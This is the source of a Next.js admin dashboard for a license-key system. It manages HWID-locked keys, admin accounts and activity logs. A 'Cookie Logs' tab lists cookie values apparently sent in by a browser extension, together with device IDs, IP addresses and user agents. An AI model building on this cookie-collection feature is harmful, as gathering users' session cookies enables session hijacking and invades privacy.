'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { fetchWithAuth } from '@/lib/api';

interface KeyData {
  id: number;
  keyCode: string;
  name: string;
  status: string;
  hwid: string;
  lockedToDevice: number;
  duration_hours: number;
  expiresAt: string;
}

interface AdminData {
  id: number;
  username: string;
  name: string;
  role: string;
  status: string;
  createdAt: string;
}

interface LogData {
  id: number;
  action: string;
  adminId: number;
  adminUsername: string;
  details: string;
  ip: string;
  timestamp: string;
}

interface CookieData {
  id: number;
  cookie_value: string;
  device_id: string;
  key_name: string;
  key_code: string;
  ip: string;
  user_agent: string;
  created_at: string;
}

export default function AdminDashboard() {
  const router = useRouter();
  
  const [keys, setKeys] = useState<KeyData[]>([]);
  const [admins, setAdmins] = useState<AdminData[]>([]);
  const [logs, setLogs] = useState<LogData[]>([]);
  const [cookies, setCookies] = useState<CookieData[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('list');
  const [search, setSearch] = useState('');
  const [adminName, setAdminName] = useState('');
  const [currentTime, setCurrentTime] = useState('');
  const [currentAdminRole, setCurrentAdminRole] = useState('');
  const [isDark, setIsDark] = useState(false);
  
  const [keyName, setKeyName] = useState('');
  const [duration, setDuration] = useState(24);
  const [generating, setGenerating] = useState(false);
  const [generatedKey, setGeneratedKey] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  
  const [newAdminUsername, setNewAdminUsername] = useState('');
  const [newAdminPassword, setNewAdminPassword] = useState('');
  const [newAdminName, setNewAdminName] = useState('');
  const [newAdminRole, setNewAdminRole] = useState('admin');
  const [registering, setRegistering] = useState(false);

  const formatRemainingTime = (expiresAt: string) => {
    const now = new Date();
    const expiry = new Date(expiresAt);
    const remainingMs = Math.max(0, expiry.getTime() - now.getTime());
    const hours = Math.floor(remainingMs / (1000 * 60 * 60));
    const minutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
    
    if (hours > 24) return `${Math.floor(hours / 24)}d ${hours % 24}h`;
    if (hours > 0) return `${hours}h ${minutes}m`;
    if (minutes > 0) return `${minutes}m ${seconds}s`;
    return `${seconds}s`;
  };

  const isExpired = (expiresAt: string) => {
    return new Date() > new Date(expiresAt);
  };

  const fetchKeys = async () => {
    try {
      const res = await fetchWithAuth('/api/dump');
      const data = await res.json();
      if (data.success) setKeys(data.keys);
    } catch (err) {
      console.error('Error fetching keys:', err);
    }
  };

  const fetchAdmins = async () => {
    try {
      const res = await fetchWithAuth('/api/admins');
      const data = await res.json();
      if (data.success) setAdmins(data.admins);
    } catch (err) {
      console.error('Error fetching admins:', err);
    }
  };

  const fetchLogs = async () => {
    try {
      const res = await fetchWithAuth('/api/logs');
      const data = await res.json();
      if (data.success) setLogs(data.logs);
    } catch (err) {
      console.error('Error fetching logs:', err);
    }
  };

  const fetchCookies = async () => {
    try {
      const res = await fetchWithAuth('/api/cookies');
      const data = await res.json();
      if (data.success) setCookies(data.list || []);
    } catch (err) {
      console.error('Error fetching cookies:', err);
    } finally {
      setLoading(false);
    }
  };

  const generateKey = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!keyName.trim()) {
      alert('Please enter a key name');
      return;
    }
    
    setGenerating(true);
    try {
      const res = await fetchWithAuth('/api/make', {
        method: 'POST',
        body: JSON.stringify({ name: keyName, duration })
      });
      const data = await res.json();
      
      if (data.success) {
        setGeneratedKey(data.keyCode);
        setShowSuccess(true);
        setKeyName('');
        fetchKeys();
        setTimeout(() => setShowSuccess(false), 5000);
      } else {
        alert(data.error || 'Failed to generate key');
      }
    } catch (err) {
      alert('Error generating key');
    } finally {
      setGenerating(false);
    }
  };

  const deleteKey = async (keyCode: string) => {
    if (confirm(`Delete key "${keyCode}"? This cannot be undone.`)) {
      try {
        await fetchWithAuth(`/api/delete?key=${keyCode}`, { method: 'DELETE' });
        fetchKeys();
      } catch (err) {
        alert('Error deleting key');
      }
    }
  };

  const resetKey = async (keyCode: string) => {
    if (confirm(`Reset HWID for key "${keyCode}"? This will allow it to be used on a new device.`)) {
      try {
        await fetchWithAuth(`/api/adminReset?key=${keyCode}`, { method: 'POST' });
        fetchKeys();
        alert('HWID reset successfully!');
      } catch (err) {
        alert('Error resetting key');
      }
    }
  };

  const deleteAllKeys = async () => {
    const confirmText = prompt('Type "DELETE ALL" to confirm deleting ALL keys:');
    if (confirmText === 'DELETE ALL') {
      try {
        await fetchWithAuth('/api/deleteAll', { method: 'DELETE' });
        fetchKeys();
        alert('All keys deleted!');
      } catch (err) {
        alert('Error deleting keys');
      }
    }
  };

  const registerAdmin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newAdminUsername.trim() || !newAdminPassword.trim() || !newAdminName.trim()) {
      alert('Please fill all fields');
      return;
    }
    
    setRegistering(true);
    try {
      const res = await fetchWithAuth('/api/register', {
        method: 'POST',
        body: JSON.stringify({
          username: newAdminUsername,
          password: newAdminPassword,
          name: newAdminName,
          role: newAdminRole
        })
      });
      const data = await res.json();
      
      if (data.success) {
        alert('Admin registered successfully!');
        setNewAdminUsername('');
        setNewAdminPassword('');
        setNewAdminName('');
        setNewAdminRole('admin');
        fetchAdmins();
      } else {
        alert(data.error || 'Failed to register admin');
      }
    } catch (err) {
      alert('Error registering admin');
    } finally {
      setRegistering(false);
    }
  };

  const deleteAdmin = async (adminId: number, username: string) => {
    if (confirm(`Delete admin "${username}"? This cannot be undone.`)) {
      try {
        await fetchWithAuth(`/api/admins/${adminId}`, { method: 'DELETE' });
        alert('Admin deleted successfully');
        fetchAdmins();
      } catch (err) {
        alert('Error deleting admin');
      }
    }
  };

  const copyKey = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('Key copied!');
  };

  const logout = () => {
    localStorage.clear();
    router.push('/login');
  };

  const toggleTheme = () => {
    const newIsDark = !isDark;
    setIsDark(newIsDark);
    if (newIsDark) {
      document.documentElement.classList.add('dark');
      localStorage.setItem('theme', 'dark');
    } else {
      document.documentElement.classList.remove('dark');
      localStorage.setItem('theme', 'light');
    }
  };

  const filteredKeys = keys.filter(k => 
    k.keyCode.toLowerCase().includes(search.toLowerCase()) ||
    k.name.toLowerCase().includes(search.toLowerCase())
  );

  const stats = {
    total: keys.length,
    active: keys.filter(k => k.status === 'active' && !isExpired(k.expiresAt)).length,
    locked: keys.filter(k => k.lockedToDevice === 1).length,
    expired: keys.filter(k => isExpired(k.expiresAt)).length,
  };

  useEffect(() => {
    const token = localStorage.getItem('adminToken');
    const name = localStorage.getItem('adminUsername');
    const role = localStorage.getItem('adminRole');
    const savedTheme = localStorage.getItem('theme');
    const isDarkMode = savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches);
    
    setIsDark(isDarkMode);
    if (isDarkMode) {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
    
    if (!token) {
      router.push('/login');
      return;
    }
    
    setAdminName(name || 'Admin');
    setCurrentAdminRole(role || 'admin');
    
    fetchKeys();
    fetchAdmins();
    fetchLogs();
    fetchCookies();
    
    const interval = setInterval(() => {
      setCurrentTime(new Date().toLocaleTimeString());
    }, 1000);
    
    return () => clearInterval(interval);
  }, []);

  if (loading) {
    return (
      <div className="fixed inset-0 bg-gradient-to-r from-indigo-600 to-purple-600 flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-white border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-white text-lg font-medium">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-900 dark:to-gray-800">
      <header className="bg-white/80 dark:bg-gray-800/80 backdrop-blur-md shadow-lg sticky top-0 z-50 border-b border-gray-200 dark:border-gray-700">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex justify-between items-center">
            <div className="flex items-center space-x-4">
              <div className="bg-gradient-to-r from-indigo-600 to-purple-600 w-10 h-10 rounded-xl flex items-center justify-center shadow-lg">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-indigo-600 to-purple-600 bg-clip-text text-transparent">License System</h1>
                <p className="text-xs text-gray-500 dark:text-gray-400">Admin Dashboard</p>
              </div>
            </div>
            <div className="flex items-center space-x-6">
              <button onClick={toggleTheme} className="p-2 rounded-lg bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-all">{isDark ? '🌙' : '☀️'}</button>
              <div className="text-right">
                <p className="text-sm font-medium text-gray-700 dark:text-gray-300">{adminName}</p>
                <p className="text-xs text-gray-500 dark:text-gray-400">{currentTime}</p>
                <p className="text-xs text-purple-600 dark:text-purple-400 font-medium capitalize">{currentAdminRole}</p>
              </div>
              <button onClick={logout} className="px-4 py-2 text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 rounded-lg transition-all">Logout</button>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-6 py-8">
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-lg p-6 border-l-4 border-indigo-500 hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between">
              <div><p className="text-sm text-gray-500 dark:text-gray-400">Total Keys</p><p className="text-3xl font-bold text-gray-800 dark:text-white">{stats.total}</p></div>
              <div className="w-12 h-12 bg-indigo-100 dark:bg-indigo-900/30 rounded-full flex items-center justify-center"><svg className="w-6 h-6 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" /></svg></div>
            </div>
          </div>
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-lg p-6 border-l-4 border-green-500 hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between">
              <div><p className="text-sm text-gray-500 dark:text-gray-400">Active Keys</p><p className="text-3xl font-bold text-green-600 dark:text-green-400">{stats.active}</p></div>
              <div className="w-12 h-12 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center"><svg className="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div>
            </div>
          </div>
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-lg p-6 border-l-4 border-orange-500 hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between">
              <div><p className="text-sm text-gray-500 dark:text-gray-400">Locked to Device</p><p className="text-3xl font-bold text-orange-600 dark:text-orange-400">{stats.locked}</p></div>
              <div className="w-12 h-12 bg-orange-100 dark:bg-orange-900/30 rounded-full flex items-center justify-center"><svg className="w-6 h-6 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></div>
            </div>
          </div>
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-lg p-6 border-l-4 border-red-500 hover:shadow-xl transition-all hover:-translate-y-1">
            <div className="flex items-center justify-between">
              <div><p className="text-sm text-gray-500 dark:text-gray-400">Expired</p><p className="text-3xl font-bold text-red-600 dark:text-red-400">{stats.expired}</p></div>
              <div className="w-12 h-12 bg-red-100 dark:bg-red-900/30 rounded-full flex items-center justify-center"><svg className="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg></div>
            </div>
          </div>
        </div>

        <div className="flex flex-wrap gap-2 bg-white dark:bg-gray-800 rounded-xl p-1 w-fit mb-6 shadow-sm">
          <button onClick={() => setActiveTab('list')} className={`px-6 py-2 rounded-lg font-medium transition-all ${activeTab === 'list' ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-md' : 'text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200'}`}>Key List</button>
          <button onClick={() => setActiveTab('create')} className={`px-6 py-2 rounded-lg font-medium transition-all ${activeTab === 'create' ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-md' : 'text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200'}`}>Create Key</button>
          <button onClick={() => setActiveTab('logs')} className={`px-6 py-2 rounded-lg font-medium transition-all ${activeTab === 'logs' ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-md' : 'text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200'}`}>Activity Logs</button>
          <button onClick={() => setActiveTab('cookies')} className={`px-6 py-2 rounded-lg font-medium transition-all ${activeTab === 'cookies' ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-md' : 'text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200'}`}>Cookie Logs</button>
          {currentAdminRole === 'superadmin' && (
            <button onClick={() => setActiveTab('admins')} className={`px-6 py-2 rounded-lg font-medium transition-all ${activeTab === 'admins' ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white shadow-md' : 'text-gray-600 dark:text-gray-400 hover:text-gray-800 dark:hover:text-gray-200'}`}>Admin Management</button>
          )}
        </div>

        {activeTab === 'list' && (
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl overflow-hidden">
            <div className="p-6 border-b border-gray-200 dark:border-gray-700 flex flex-wrap gap-4 justify-between items-center">
              <div className="relative flex-1 max-w-md">
                <svg className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
                <input type="text" placeholder="Search by key or name..." className="w-full px-4 py-3 pl-10 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none" value={search} onChange={(e) => setSearch(e.target.value)} />
              </div>
              <button onClick={deleteAllKeys} className="px-6 py-2 bg-gradient-to-r from-red-600 to-pink-600 text-white rounded-xl hover:shadow-lg transform hover:scale-105 transition-all">Delete All Keys</button>
            </div>
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 dark:bg-gray-900/50">
                  <tr><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Name</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Key Code</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Status</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Remaining</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Expires</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Actions</th></tr>
                </thead>
                <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                  {filteredKeys.length === 0 ? (
                    <tr><td colSpan={6} className="px-6 py-12 text-center text-gray-500">No keys found. Create your first key!</td></tr>
                  ) : (
                    filteredKeys.map((key) => {
                      const expired = isExpired(key.expiresAt);
                      return (
                        <tr key={key.id} className="hover:bg-gray-50 dark:hover:bg-gray-700/50 transition-colors">
                          <td className="px-6 py-4 font-medium text-gray-900 dark:text-white">{key.name}</td>
                          <td className="px-6 py-4"><code className="px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded text-sm font-mono">{key.keyCode}</code></td>
                          <td className="px-6 py-4"><span className={`px-2 py-1 text-xs rounded-full ${!expired ? 'bg-green-100 text-green-800 dark:bg-green-900/30 dark:text-green-400' : 'bg-red-100 text-red-800 dark:bg-red-900/30 dark:text-red-400'}`}>{expired ? 'Expired' : 'Active'}</span></td>
                          <td className="px-6 py-4"><span className={!expired && new Date(key.expiresAt).getTime() - new Date().getTime() < 86400000 ? 'text-orange-500 font-medium' : 'text-gray-600 dark:text-gray-400'}>{!expired ? formatRemainingTime(key.expiresAt) : '-'}</span></td>
                          <td className="px-6 py-4 text-sm text-gray-500 dark:text-gray-400">{new Date(key.expiresAt).toLocaleDateString()}</td>
                          <td className="px-6 py-4"><div className="flex gap-3"><button onClick={() => resetKey(key.keyCode)} className="text-orange-600 hover:text-orange-800 dark:text-orange-400 transition-colors" title="Reset HWID"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg></button><button onClick={() => deleteKey(key.keyCode)} className="text-red-600 hover:text-red-800 dark:text-red-400 transition-colors" title="Delete Key"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button></div></td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === 'create' && (
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl p-8 max-w-2xl mx-auto">
            <div className="text-center mb-6">
              <div className="bg-gradient-to-r from-indigo-600 to-purple-600 w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
                <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" /></svg>
              </div>
              <h2 className="text-2xl font-bold text-gray-800 dark:text-white">Generate New Key</h2>
              <p className="text-gray-500 dark:text-gray-400 text-sm mt-1">Create a license key for your users</p>
            </div>
            <form onSubmit={generateKey} className="space-y-6">
              <div><label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Key Name</label><input type="text" className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none" placeholder="e.g., John Doe - Premium User" value={keyName} onChange={(e) => setKeyName(e.target.value)} required /><p className="text-xs text-gray-500 mt-1">Give this key a name to track who is using it</p></div>
              <div><label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">Duration</label><select className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-transparent outline-none" value={duration} onChange={(e) => setDuration(Number(e.target.value))}><option value={1}>1 Hour</option><option value={6}>6 Hours</option><option value={12}>12 Hours</option><option value={24}>24 Hours (1 day)</option><option value={72}>72 Hours (3 days)</option><option value={168}>168 Hours (7 days)</option><option value={720}>720 Hours (30 days)</option><option value={2160}>2160 Hours (90 days)</option><option value={8760}>8760 Hours (365 days)</option></select></div>
              <button type="submit" disabled={generating} className="w-full px-6 py-3 bg-gradient-to-r from-indigo-600 to-purple-600 text-white rounded-xl font-semibold shadow-lg hover:shadow-xl transform hover:scale-105 transition-all disabled:opacity-50">{generating ? 'Generating...' : 'Generate Key'}</button>
            </form>
            {showSuccess && generatedKey && (
              <div className="mt-6 p-4 bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-900/20 dark:to-emerald-900/20 rounded-xl border border-green-200 dark:border-green-800">
                <div className="flex items-center gap-2 mb-3"><svg className="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg><p className="text-green-800 dark:text-green-400 font-medium">Key Generated Successfully!</p></div>
                <div className="flex gap-2"><code className="flex-1 bg-white dark:bg-gray-900 px-4 py-2 rounded-lg text-lg font-mono border border-green-300 dark:border-green-700">{generatedKey}</code><button onClick={() => copyKey(generatedKey)} className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-all">Copy</button></div>
                <p className="text-xs text-green-700 dark:text-green-400 mt-3">Valid for {duration} hours</p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'logs' && (
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl overflow-hidden">
            <div className="p-6 border-b border-gray-200 dark:border-gray-700"><h2 className="text-lg font-bold text-gray-800 dark:text-white">Activity Logs</h2><p className="text-sm text-gray-500 dark:text-gray-400">Track all system activities</p></div>
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 dark:bg-gray-900/50">
                  <tr><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Timestamp</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Action</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Admin</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Details</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">IP Address</th></tr>
                </thead>
                <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                  {logs.length === 0 ? (<tr><td colSpan={5} className="px-6 py-12 text-center text-gray-500">No activity logs found</td></tr>) : (
                    logs.map((log) => (<tr key={log.id} className="hover:bg-gray-50 dark:hover:bg-gray-700/50"><td className="px-6 py-4 text-sm text-gray-600 dark:text-gray-400">{new Date(log.timestamp).toLocaleString()}</td><td className="px-6 py-4"><span className="px-2 py-1 text-xs rounded-full bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400">{log.action}</span></td><td className="px-6 py-4 font-medium text-gray-900 dark:text-white">{log.adminUsername}</td><td className="px-6 py-4 text-sm text-gray-600 dark:text-gray-400">{log.details}</td><td className="px-6 py-4 text-sm font-mono text-gray-500 dark:text-gray-400">{log.ip}</td></tr>))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === 'cookies' && (
          <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl overflow-hidden">
            <div className="p-6 border-b border-gray-200 dark:border-gray-700"><h2 className="text-lg font-bold text-gray-800 dark:text-white">Cookie Logs</h2><p className="text-sm text-gray-500 dark:text-gray-400">Track cookies from extension</p></div>
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-50 dark:bg-gray-900/50">
                  <tr><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Timestamp</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Cookie Value</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Device ID</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Key Name</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">IP Address</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">User Agent</th></tr>
                </thead>
                <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                  {cookies.length === 0 ? (<tr><td colSpan={6} className="px-6 py-12 text-center text-gray-500">No cookie logs found</td></tr>) : (
                    cookies.map((cookie) => (<tr key={cookie.id} className="hover:bg-gray-50 dark:hover:bg-gray-700/50"><td className="px-6 py-4 text-sm text-gray-600 dark:text-gray-400">{new Date(cookie.created_at).toLocaleString()}</td><td className="px-6 py-4"><code className="text-xs bg-gray-100 dark:bg-gray-800 px-2 py-1 rounded">{cookie.cookie_value?.substring(0, 40)}...</code></td><td className="px-6 py-4 text-sm font-mono">{cookie.device_id || '-'}</td><td className="px-6 py-4 text-sm">{cookie.key_name || '-'}</td><td className="px-6 py-4 text-sm font-mono">{cookie.ip || '-'}</td><td className="px-6 py-4 text-xs text-gray-500 dark:text-gray-400 break-all">{cookie.user_agent?.substring(0, 50)}...</td></tr>))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {activeTab === 'admins' && currentAdminRole === 'superadmin' && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl p-8">
              <div className="text-center mb-6">
                <div className="bg-gradient-to-r from-green-600 to-teal-600 w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
                  <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z" /></svg>
                </div>
                <h2 className="text-xl font-bold text-gray-800 dark:text-white">Register New Admin</h2>
                <p className="text-gray-500 dark:text-gray-400 text-sm">Create additional admin accounts</p>
              </div>
              <form onSubmit={registerAdmin} className="space-y-4">
                <input type="text" placeholder="Username" className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none" value={newAdminUsername} onChange={(e) => setNewAdminUsername(e.target.value)} required />
                <input type="password" placeholder="Password" className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none" value={newAdminPassword} onChange={(e) => setNewAdminPassword(e.target.value)} required />
                <input type="text" placeholder="Display Name" className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none" value={newAdminName} onChange={(e) => setNewAdminName(e.target.value)} required />
                <select className="w-full px-4 py-3 bg-gray-50 dark:bg-gray-900 border border-gray-200 dark:border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none" value={newAdminRole} onChange={(e) => setNewAdminRole(e.target.value)}><option value="admin">Admin</option><option value="moderator">Moderator</option></select>
                <p className="text-xs text-gray-500 mt-1">Admin: Can manage keys | Moderator: View only</p>
                <button type="submit" disabled={registering} className="w-full px-6 py-3 bg-gradient-to-r from-green-600 to-teal-600 text-white rounded-xl font-semibold shadow-lg hover:shadow-xl transform hover:scale-105 transition-all disabled:opacity-50">{registering ? 'Registering...' : 'Register Admin'}</button>
              </form>
            </div>
            <div className="bg-white dark:bg-gray-800 rounded-2xl shadow-xl overflow-hidden">
              <div className="p-6 border-b border-gray-200 dark:border-gray-700"><h2 className="text-lg font-bold text-gray-800 dark:text-white">Existing Admins</h2><p className="text-sm text-gray-500 dark:text-gray-400">Manage admin accounts</p></div>
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead className="bg-gray-50 dark:bg-gray-900/50">
                    <tr><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Username</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Name</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Role</th><th className="px-6 py-4 text-left text-xs font-medium text-gray-500 uppercase">Actions</th></tr>
                </thead>
                <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                  {admins.length === 0 ? (<tr><td colSpan={4} className="px-6 py-12 text-center text-gray-500">No admins found</td></tr>) : (
                    admins.map((admin) => (<tr key={admin.id} className="hover:bg-gray-50 dark:hover:bg-gray-700/50"><td className="px-6 py-4 font-medium text-gray-900 dark:text-white">@{admin.username}</td><td className="px-6 py-4 text-gray-700 dark:text-gray-300">{admin.name}</td><td className="px-6 py-4"><span className={`px-2 py-1 text-xs rounded-full ${admin.role === 'superadmin' ? 'bg-purple-100 text-purple-800 dark:bg-purple-900/30 dark:text-purple-400' : 'bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-400'}`}>{admin.role}</span></td><td className="px-6 py-4">{admin.role !== 'superadmin' && <button onClick={() => deleteAdmin(admin.id, admin.username)} className="text-red-600 hover:text-red-800 transition-colors">Delete</button>}{admin.role === 'superadmin' && <span className="text-gray-400 text-xs">Protected</span>}</td></tr>))
                  )}
                </tbody>
              </table>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}